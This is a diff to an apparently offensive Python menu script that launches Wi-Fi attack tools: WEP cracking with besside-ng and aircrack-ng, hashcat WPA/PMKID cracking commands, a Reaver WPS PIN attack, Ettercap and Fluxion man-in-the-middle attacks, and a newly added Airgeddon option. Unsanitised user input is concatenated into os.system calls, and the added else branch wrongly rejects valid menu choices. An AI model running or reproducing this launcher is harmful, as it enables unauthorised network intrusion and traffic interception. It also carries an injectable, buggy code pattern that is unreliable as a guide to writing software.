@@ -24,7 +24,8 @@ def main():
   print('*[6] Wifite2 (Automated Network Cracker)                 *')
   print('*[7] Ettercap (MiTM Attack)                              *')
   print('*[8] Fluxion (MiTM/Router Spoof Attack)                  *')
-  print('*[9] Exit                                                *')
+  print('*[9] Airgeddon (Attack Framework - Graphical)            *')
+  print('*[10] Exit                                               *')
   print('==========================================================')
   in_put = input(': ')
   if in_put == '1':
@@ -32,21 +33,18 @@ def main():
     print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
     os.system('airodump-ng ' + interface + 'mon')
     wait()
-    main()
   if in_put == '2':
     print(Fore.CYAN + '[*]Make sure to note down network bssid and channel number...')
     print('[*]Enter ^C or ^Z to exit scanner mode...' + Style.RESET_ALL)
     os.system('wash -i ' + interface + 'mon')
     wait()
-    main()
   if in_put == '3':
     bssid = input(Fore.CYAN + '[*]Enter WEP Network BSSID: ' + Style.RESET_ALL)
     channel = input(Fore.CYAN + '[*]Enter WEP Network Channel: ' + Style.RESET_ALL)
     print(Fore.CYAN + '[*]Gathering Packets From Network: ' + bssid + '... (Wait Until You Have About 1000 IVs)' + Style.RESET_ALL)
     os.system('besside-ng -b ' + bssid + ' -c ' + channel + ' ' + interface + 'mon')
-    os.system('aircrack-ng wep.pcap')
+    os.system('aircrack-ng wep.cap')
     wait()
-    main()
   if in_put == '4':
     adapt = input(Fore.CYAN + '[*]Do you have a wifi adapter with packet injection?[y/N]: ' + Style.RESET_ALL)
     if adapt == 'y' or adapt == 'Y':
@@ -61,18 +59,15 @@ def main():
       print(Fore.CYAN + '  [*]  Wordlist: hashcat -m 16800 outputHC.16800 -a 0 --force wordlist.lst -O')
       print(Fore.CYAN + '  [*]Bruteforce: hashcat -m 16800 outputHC.16800 -a 3 --force ?a?a?a?a?a?a -O')
       wait()
-      main()
     else:
       print(Fore.RED + "[*]You can't attack a WPA/WPA2 encrypted network without packet injection..." + Style.RESET_ALL)
       wait()
-      main()
   if in_put == '5':
     bssid = input(Fore.CYAN + '[*]Enter Network BSSID: ' + Style.RESET_ALL)
     channel = input(Fore.CYAN + '[*]Enter Network Channel: ' + Style.RESET_ALL)
     print(Fore.CYAN + '[*]Running Reaver to attack WPS PIN exploit...' + Style.RESET_ALL)
     os.system('reaver -i ' + interface + 'mon -b ' + bssid + ' -c ' + channel + '  -vv -Z')
     wait()
-    main()
   if in_put == '6':
     print(Fore.CYAN + '[*]Starting Wifite2...' + Style.RESET_ALL)
     try:
@@ -82,7 +77,6 @@ def main():
     except:
       print(Fore.RED + '[*]Error running wifite.py' + Style.RESET_ALL)
     os.chdir('..')
-    main()
   if in_put == '7':
     got = input(Fore.CYAN + '[*]Do you want to run ettercap in Graphical or Text mode?[G/T]: ' + Style.RESET_ALL)
     try:
@@ -97,7 +91,6 @@ def main():
     except:
       print(Fore.RED + '[*]Error running ettercap!' + Style.RESET_ALL)
     wait()
-    main()
   if in_put == '8':
     print(Fore.CYAN + '[*]Starting Fluxion...' + Style.RESET_ALL)
     try:
@@ -107,8 +100,22 @@ def main():
     except:
       print(Fore.RED + '[*]Error running fluxion.sh' + Style.RESET_ALL)
     os.chdir('..')
-    main()
   if in_put == '9':
+    print(Fore.CYAN + '[*]Starting Airgeddon...' + Style.RESET_ALL)
+    try:
+      os.chdir('airgeddon')
+      os.system('./airgeddon.sh')
+      print(Fore.GREEN + '[+]Successfully ran airgeddon.sh!' + Style.RESET_ALL)
+    except:
+      print(Fore.RED + '[*]Error running airgeddon.sh' + Style.RESET_ALL)
+    os.chdir('..')
+  if in_put == '10':
+    print(Fore.CYAN + '[*]Shutting down ' + interface + 'mon...' + Style.RESET_ALL)
+    os.system('airmon-ng stop ' + interface)
+    os.system('airmon-ng stop ' + interface + 'mon')
+    os.system('ifconfig ' + interface + ' up')
     exit()
-
+  else:
+    print(Fore.RED + '[*]Not an option!' + Style.RESET_ALL)
+  main()
 main()
